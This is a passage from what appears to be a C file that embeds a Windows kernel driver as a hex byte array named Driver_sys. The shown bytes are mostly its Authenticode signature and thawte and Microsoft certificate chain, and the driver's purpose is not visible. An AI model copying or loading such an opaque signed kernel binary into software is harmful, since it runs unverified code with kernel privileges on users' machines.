0x9D, 0x4F, 0xBA, 0xE8, 0x40, 0x81, 0x91, 0xC6, 0xA4, 0xCE, 0x94, 0x72, 0x1B, 0x01, 0xCF, 0x2A,
0x6E, 0x15, 0x67, 0x95, 0x89, 0xAE, 0x7D, 0xB7, 0xB7, 0xCD, 0xF9, 0x0A, 0x3D, 0x75, 0xB6, 0x6B,
0x3C, 0x25, 0x30, 0x82, 0x05, 0x79, 0x30, 0x82, 0x03, 0x61, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02,
0x0A, 0x61, 0x1F, 0xB0, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1D, 0x30, 0x0D, 0x06, 0x09, 0x2A,
0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x7F, 0x31, 0x0B, 0x30, 0x09,
0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55,
0x04, 0x08, 0x13, 0x0A, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6E, 0x67, 0x74, 0x6F, 0x6E, 0x31, 0x10,
0x30, 0x0E, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6D, 0x6F, 0x6E, 0x64,
0x31, 0x1E, 0x30, 0x1C, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x15, 0x4D, 0x69, 0x63, 0x72, 0x6F,
0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E,
0x31, 0x29, 0x30, 0x27, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x20, 0x4D, 0x69, 0x63, 0x72, 0x6F,
0x73, 0x6F, 0x66, 0x74, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x56, 0x65, 0x72, 0x69, 0x66, 0x69,
0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x52, 0x6F, 0x6F, 0x74, 0x30, 0x1E, 0x17, 0x0D, 0x31,
0x31, 0x30, 0x32, 0x32, 0x32, 0x31, 0x39, 0x33, 0x31, 0x35, 0x37, 0x5A, 0x17, 0x0D, 0x32, 0x31,
0x30, 0x32, 0x32, 0x32, 0x31, 0x39, 0x34, 0x31, 0x35, 0x37, 0x5A, 0x30, 0x81, 0xA9, 0x31, 0x0B,
0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x15, 0x30, 0x13, 0x06,
0x03, 0x55, 0x04, 0x0A, 0x13, 0x0C, 0x74, 0x68, 0x61, 0x77, 0x74, 0x65, 0x2C, 0x20, 0x49, 0x6E,
0x63, 0x2E, 0x31, 0x28, 0x30, 0x26, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x1F, 0x43, 0x65, 0x72,
0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69,
0x63, 0x65, 0x73, 0x20, 0x44, 0x69, 0x76, 0x69, 0x73, 0x69, 0x6F, 0x6E, 0x31, 0x38, 0x30, 0x36,
0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x2F, 0x28, 0x63, 0x29, 0x20, 0x32, 0x30, 0x30, 0x36, 0x20,
0x74, 0x68, 0x61, 0x77, 0x74, 0x65, 0x2C, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x20, 0x2D, 0x20, 0x46,
0x6F, 0x72, 0x20, 0x61, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x75, 0x73,
0x65, 0x20, 0x6F, 0x6E, 0x6C, 0x79, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13,
0x16, 0x74, 0x68, 0x61, 0x77, 0x74, 0x65, 0x20, 0x50, 0x72, 0x69, 0x6D, 0x61, 0x72, 0x79, 0x20,
0x52, 0x6F, 0x6F, 0x74, 0x20, 0x43, 0x41, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A,
0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30,
0x82, 0x01, 0x0A, 0x02, 0x82, 0x01, 0x01, 0x00, 0xAC, 0xA0, 0xF0, 0xFB, 0x80, 0x59, 0xD4, 0x9C,
0xC7, 0xA4, 0xCF, 0x9D, 0xA1, 0x59, 0x73, 0x09, 0x10, 0x45, 0x0C, 0x0D, 0x2C, 0x6E, 0x68, 0xF1,
0x6C, 0x5B, 0x48, 0x68, 0x49, 0x59, 0x37, 0xFC, 0x0B, 0x33, 0x19, 0xC2, 0x77, 0x7F, 0xCC, 0x10,
0x2D, 0x95, 0x34, 0x1C, 0xE6, 0xEB, 0x4D, 0x09, 0xA7, 0x1C, 0xD2, 0xB8, 0xC9, 0x97, 0x36, 0x02,
0xB7, 0x89, 0xD4, 0x24, 0x5F, 0x06, 0xC0, 0xCC, 0x44, 0x94, 0x94, 0x8D, 0x02, 0x62, 0x6F, 0xEB,
0x5A, 0xDD, 0x11, 0x8D, 0x28, 0x9A, 0x5C, 0x84, 0x90, 0x10, 0x7A, 0x0D, 0xBD, 0x74, 0x66, 0x2F,
0x6A, 0x38, 0xA0, 0xE2, 0xD5, 0x54, 0x44, 0xEB, 0x1D, 0x07, 0x9F, 0x07, 0xBA, 0x6F, 0xEE, 0xE9,
0xFD, 0x4E, 0x0B, 0x29, 0xF5, 0x3E, 0x84, 0xA0, 0x01, 0xF1, 0x9C, 0xAB, 0xF8, 0x1C, 0x7E, 0x89,
0xA4, 0xE8, 0xA1, 0xD8, 0x71, 0x65, 0x0D, 0xA3, 0x51, 0x7B, 0xEE, 0xBC, 0xD2, 0x22, 0x60, 0x0D,
0xB9, 0x5B, 0x9D, 0xDF, 0xBA, 0xFC, 0x51, 0x5B, 0x0B, 0xAF, 0x98, 0xB2, 0xE9, 0x2E, 0xE9, 0x04,
0xE8, 0x62, 0x87, 0xDE, 0x2B, 0xC8, 0xD7, 0x4E, 0xC1, 0x4C, 0x64, 0x1E, 0xDD, 0xCF, 0x87, 0x58,
0xBA, 0x4A, 0x4F, 0xCA, 0x68, 0x07, 0x1D, 0x1C, 0x9D, 0x4A, 0xC6, 0xD5, 0x2F, 0x91, 0xCC, 0x7C,
0x71, 0x72, 0x1C, 0xC5, 0xC0, 0x67, 0xEB, 0x32, 0xFD, 0xC9, 0x92, 0x5C, 0x94, 0xDA, 0x85, 0xC0,
0x9B, 0xBF, 0x53, 0x7D, 0x2B, 0x09, 0xF4, 0x8C, 0x9D, 0x91, 0x1F, 0x97, 0x6A, 0x52, 0xCB, 0xDE,
0x09, 0x36, 0xA4, 0x77, 0xD8, 0x7B, 0x87, 0x50, 0x44, 0xD5, 0x3E, 0x6E, 0x29, 0x69, 0xFB, 0x39,
0x49, 0x26, 0x1E, 0x09, 0xA5, 0x80, 0x7B, 0x40, 0x2D, 0xEB, 0xE8, 0x27, 0x85, 0xC9, 0xFE, 0x61,
0xFD, 0x7E, 0xE6, 0x7C, 0x97, 0x1D, 0xD5, 0x9D, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x81, 0xCB,
0x30, 0x81, 0xC8, 0x30, 0x11, 0x06, 0x03, 0x55, 0x1D, 0x20, 0x04, 0x0A, 0x30, 0x08, 0x30, 0x06,
0x06, 0x04, 0x55, 0x1D, 0x20, 0x00, 0x30, 0x0F, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF,
0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xFF, 0x30, 0x0B, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x04, 0x04,
0x03, 0x02, 0x01, 0x86, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0x7B,
0x5B, 0x45, 0xCF, 0xAF, 0xCE, 0xCB, 0x7A, 0xFD, 0x31, 0x92, 0x1A, 0x6A, 0xB6, 0xF3, 0x46, 0xEB,
0x57, 0x48, 0x50, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14,
0x62, 0xFB, 0x0A, 0x21, 0x5B, 0x7F, 0x43, 0x6E, 0x11, 0xDA, 0x09, 0x54, 0x50, 0x6B, 0xF5, 0xD2,
0x96, 0x71, 0xF1, 0x9E, 0x30, 0x55, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x4E, 0x30, 0x4C, 0x30,
0x4A, 0xA0, 0x48, 0xA0, 0x46, 0x86, 0x44, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72,
0x6C, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F,
0x70, 0x6B, 0x69, 0x2F, 0x63, 0x72, 0x6C, 0x2F, 0x70, 0x72, 0x6F, 0x64, 0x75, 0x63, 0x74, 0x73,
0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x43, 0x6F, 0x64, 0x65, 0x56, 0x65,
0x72, 0x69, 0x66, 0x52, 0x6F, 0x6F, 0x74, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x0D, 0x06, 0x09, 0x2A,
0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x02, 0x01, 0x00, 0x2D,
0xCC, 0x71, 0xB5, 0xE8, 0xBA, 0x94, 0xFF, 0x5E, 0xE6, 0x44, 0x67, 0x00, 0x7B, 0x6A, 0xFC, 0x41,
0x2C, 0x3E, 0xE7, 0x0E, 0x41, 0x85, 0x5A, 0xB1, 0x2A, 0x93, 0x2B, 0xA9, 0x5B, 0x89, 0xF2, 0xF7,
0x2B, 0x49, 0x9C, 0x80, 0x03, 0xF2, 0x97, 0xB8, 0xE7, 0x60, 0xA8, 0x0E, 0xD7, 0xFD, 0x5D, 0xE5,
0x45, 0x46, 0x75, 0x94, 0xF4, 0xED, 0x1C, 0x9D, 0xE1, 0x66, 0x22, 0x8B, 0x61, 0xFB, 0x29, 0xF2,
0xC6, 0xA8, 0xBD, 0xF3, 0x87, 0xC9, 0x8F, 0x7F, 0x47, 0xE1, 0xC0, 0x58, 0xB6, 0x4A, 0x1A, 0xA2,
0xE7, 0xF7, 0x18, 0x60, 0x69, 0x69, 0xE0, 0x83, 0x06, 0x9E, 0x26, 0xC7, 0x75, 0xC4, 0x0C, 0x0D,
0x79, 0xDA, 0x74, 0x6B, 0x52, 0xB9, 0xFA, 0xE8, 0xEA, 0x33, 0x59, 0xB9, 0xBB, 0x18, 0xDD, 0x29,
0x1A, 0x14, 0xDF, 0xD3, 0x6A, 0x37, 0x27, 0x7A, 0x9D, 0xA0, 0xDA, 0xCF, 0xFF, 0xFC, 0x22, 0xC4,
0xFA, 0xF0, 0x09, 0xFF, 0x33, 0xE9, 0x3E, 0x17, 0xBA, 0x1C, 0xC7, 0x42, 0xCF, 0xCE, 0x27, 0x43,
0xD3, 0x0C, 0x0C, 0x55, 0x81, 0x30, 0x3D, 0xB9, 0x60, 0x60, 0xCE, 0x02, 0xEC, 0xE1, 0x9E, 0xE8,
0x1D, 0xDC, 0x85, 0x2C, 0xE0, 0xA1, 0x8D, 0x96, 0x6D, 0x95, 0xAC, 0x17, 0xA4, 0x71, 0x3E, 0xA1,
0x67, 0x41, 0xB6, 0x28, 0x1D, 0x2C, 0xE3, 0xB6, 0x15, 0xE5, 0xB7, 0xE5, 0xA2, 0xF6, 0x25, 0x6D,
0x86, 0xE3, 0x20, 0xAC, 0xF9, 0xF8, 0x31, 0x4F, 0x8E, 0x62, 0x9B, 0x98, 0x33, 0x37, 0x6D, 0x6A,
0xF7, 0x35, 0x52, 0x3E, 0x90, 0xFE, 0xB0, 0x3B, 0x5F, 0xC5, 0xB8, 0x52, 0xA9, 0xE0, 0x6E, 0xA0,
0x47, 0x9A, 0x27, 0x9E, 0x97, 0xAE, 0xA2, 0x4A, 0x9E, 0x53, 0x19, 0x39, 0xEC, 0x35, 0x7E, 0xC6,
0x59, 0xDE, 0x3A, 0xE0, 0xAA, 0xF5, 0x33, 0xF0, 0x6A, 0xBD, 0xA0, 0x82, 0x18, 0x12, 0xDE, 0xA1,
0x8C, 0x45, 0x70, 0xCA, 0x2B, 0xD6, 0x2E, 0x95, 0x91, 0x45, 0x99, 0x5A, 0x5C, 0x24, 0x00, 0x49,
0xBD, 0x23, 0xB3, 0x0C, 0xEC, 0xA4, 0x3D, 0xF5, 0xB9, 0xE1, 0xD1, 0xB1, 0x82, 0x5A, 0x38, 0xEE,
0xA3, 0xFB, 0xA1, 0xAB, 0x48, 0x3A, 0x8C, 0x5D, 0xFF, 0xA0, 0x65, 0x22, 0x3F, 0xD3, 0xD3, 0xFE,
0x49, 0x90, 0xDB, 0x14, 0x46, 0xA3, 0x85, 0x2E, 0x8A, 0x55, 0x4B, 0x09, 0xAB, 0x38, 0xB2, 0xAB,
0x63, 0xA0, 0x08, 0xD1, 0xFD, 0xAD, 0x48, 0xE2, 0x73, 0xD8, 0x12, 0xBC, 0xC2, 0x6C, 0xA5, 0x16,
0xFA, 0xD0, 0x9A, 0xC0, 0x5E, 0x38, 0x38, 0x3A, 0x2B, 0x71, 0x8E, 0x55, 0x3A, 0xAC, 0x42, 0x19,
0x7A, 0x1F, 0x0D, 0x42, 0x20, 0xE7, 0xAB, 0x5D, 0x8C, 0x68, 0x80, 0x52, 0x4C, 0xA1, 0xC0, 0xD4,
0x88, 0xD0, 0x23, 0x21, 0xFB, 0x90, 0x13, 0x09, 0x00, 0x7B, 0x49, 0x37, 0xAF, 0xA9, 0xDF, 0x48,
0x60, 0x22, 0xAB, 0xF4, 0xF6, 0xC2, 0x36, 0x3B, 0xF8, 0x51, 0x3C, 0x34, 0xBB, 0xC5, 0x86, 0xE4,
0x3A, 0xE1, 0x9F, 0x4B, 0x90, 0xFE, 0x54, 0x61, 0x02, 0x4B, 0x15, 0x9C, 0x34, 0x17, 0x6A, 0xA9,
0x4B, 0x8D, 0x4C, 0xB6, 0x9D, 0x23, 0x26, 0xC8, 0x3A, 0xF1, 0xD6, 0xB8, 0x05, 0xCD, 0xDA, 0x1D,
0x62, 0x40, 0x18, 0x3A, 0x2F, 0x1B, 0x41, 0xCD, 0x3A, 0x99, 0x3A, 0x0A, 0xA9, 0xD1, 0xD7, 0x7E,
0xB8, 0xC4, 0xAF, 0xF7, 0xB8, 0xC9, 0x80, 0x10, 0x5E, 0xD5, 0x5D, 0xF6, 0xCE, 0x7A, 0x9A, 0x02,
0xC5, 0x0F, 0x63, 0x81, 0xEF, 0xB5, 0x64, 0xE9, 0xFC, 0x5B, 0xD8, 0xD2, 0x61, 0x9A, 0x68, 0xC3,
0x7C, 0xF9, 0xC7, 0x8D, 0xF9, 0x1E, 0x87, 0xD5, 0xFA, 0x2C, 0xF8, 0x16, 0xAE, 0x9D, 0xAB, 0x06,
0x8F, 0xC8, 0x6D, 0xC7, 0x41, 0xCD, 0xA1, 0x4E, 0x84, 0xE3, 0xDA, 0xC2, 0x6E, 0xBC, 0xFB, 0x31,
0x82, 0x01, 0xF7, 0x30, 0x82, 0x01, 0xF3, 0x02, 0x01, 0x01, 0x30, 0x5E, 0x30, 0x4A, 0x31, 0x0B,
0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x15, 0x30, 0x13, 0x06,
0x03, 0x55, 0x04, 0x0A, 0x13, 0x0C, 0x54, 0x68, 0x61, 0x77, 0x74, 0x65, 0x2C, 0x20, 0x49, 0x6E,
0x63, 0x2E, 0x31, 0x24, 0x30, 0x22, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1B, 0x54, 0x68, 0x61,
0x77, 0x74, 0x65, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67,
0x20, 0x43, 0x41, 0x20, 0x2D, 0x20, 0x47, 0x32, 0x02, 0x10, 0x4E, 0xFA, 0x7E, 0x7B, 0xBA, 0x65,
0xEC, 0x1A, 0xB7, 0x74, 0xF2, 0xB3, 0x13, 0x57, 0xD5, 0x99, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E,
0x03, 0x02, 0x1A, 0x05, 0x00, 0xA0, 0x70, 0x30, 0x10, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01,
0x82, 0x37, 0x02, 0x01, 0x0C, 0x31, 0x02, 0x30, 0x00, 0x30, 0x19, 0x06, 0x09, 0x2A, 0x86, 0x48,
0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82,
0x37, 0x02, 0x01, 0x04, 0x30, 0x1C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02,
0x01, 0x0B, 0x31, 0x0E, 0x30, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02,
0x01, 0x16, 0x30, 0x23, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31,
0x16, 0x04, 0x14, 0x94, 0x1D, 0xE1, 0xB9, 0x4C, 0x7F, 0x3B, 0x26, 0x00, 0x61, 0xE7, 0x50, 0x11,
0x92, 0xC9, 0xBC, 0xC3, 0xAD, 0xC6, 0x9E, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7,
0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x82, 0x01, 0x00, 0xA2, 0xFC, 0x06, 0xCF, 0x5B, 0x1D,
0x32, 0x01, 0x6A, 0xEE, 0x2A, 0x66, 0x82, 0xF7, 0x0F, 0xBE, 0x0C, 0xDF, 0xBA, 0x8E, 0xB8, 0x24,
0x48, 0x1D, 0x36, 0xE8, 0x7C, 0x76, 0x14, 0xCB, 0xB7, 0x86, 0x4D, 0x35, 0xA7, 0xD5, 0xE9, 0xA4,
0x6D, 0xA6, 0x7B, 0x8A, 0xEB, 0xD3, 0x81, 0xCB, 0x75, 0x3F, 0x14, 0x8A, 0x76, 0x33, 0x71, 0x97,
0x99, 0x0F, 0xCC, 0x2A, 0x68, 0xF0, 0x74, 0x52, 0xFB, 0x5B, 0xBA, 0x13, 0x85, 0xA5, 0xF3, 0x14,
0xD7, 0x08, 0x39, 0x44, 0x13, 0x0A, 0x60, 0xC4, 0xAB, 0x11, 0x2D, 0x87, 0x12, 0xC1, 0xFD, 0xEF,
0xB1, 0x63, 0x06, 0x0C, 0x50, 0x11, 0x52, 0x15, 0xD8, 0xFB, 0xED, 0x5F, 0x96, 0x53, 0xD8, 0x23,
0x33, 0x18, 0xE5, 0x6B, 0x8D, 0x8A, 0x36, 0x8B, 0x8A, 0x97, 0x06, 0x03, 0xB9, 0x82, 0x69, 0x40,
0x1F, 0x36, 0xE6, 0xF1, 0xAD, 0xFF, 0x73, 0x89, 0x01, 0xEA, 0x80, 0x77, 0x6A, 0x3C, 0x5F, 0x5C,
0x1E, 0xDA, 0xFE, 0xE9, 0xD1, 0x67, 0xBC, 0x9C, 0xED, 0xDC, 0x92, 0x2C, 0x23, 0xF0, 0x66, 0xA6,
0xBE, 0x7A, 0x9B, 0x1A, 0x9F, 0xE7, 0x4D, 0x6E, 0x90, 0xA0, 0x22, 0x6D, 0x90, 0x55, 0x1E, 0x0C,
0x69, 0x99, 0x98, 0x51, 0x99, 0x68, 0x73, 0xAB, 0xFA, 0x37, 0xAF, 0x96, 0xFA, 0x4A, 0xD8, 0x24,
0x17, 0x70, 0x46, 0x81, 0x9C, 0x51, 0x5E, 0x53, 0xBB, 0xC0, 0x4C, 0x8F, 0x27, 0x76, 0xAB, 0xA8,
0x31, 0xB5, 0x64, 0x96, 0xF6, 0x62, 0xF7, 0x0F, 0x45, 0x54, 0xD3, 0x9E, 0x8C, 0xCB, 0x1F, 0x03,
0x4C, 0x03, 0x3D, 0xB9, 0x55, 0x0D, 0x21, 0x2B, 0x1F, 0x13, 0xDA, 0x23, 0x9A, 0xDB, 0x73, 0x61,
0xE3, 0x62, 0x72, 0xAD, 0xF2, 0xFD, 0xED, 0x33, 0xE2, 0x4D, 0xE5, 0x4D, 0xCC, 0xEC, 0x87, 0x96,
0xA8, 0x38, 0xA2, 0x7F, 0x22, 0x44, 0xB2, 0x8A, 0x77, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

};
unsigned int Driver_sys_len = sizeof(Driver_sys);
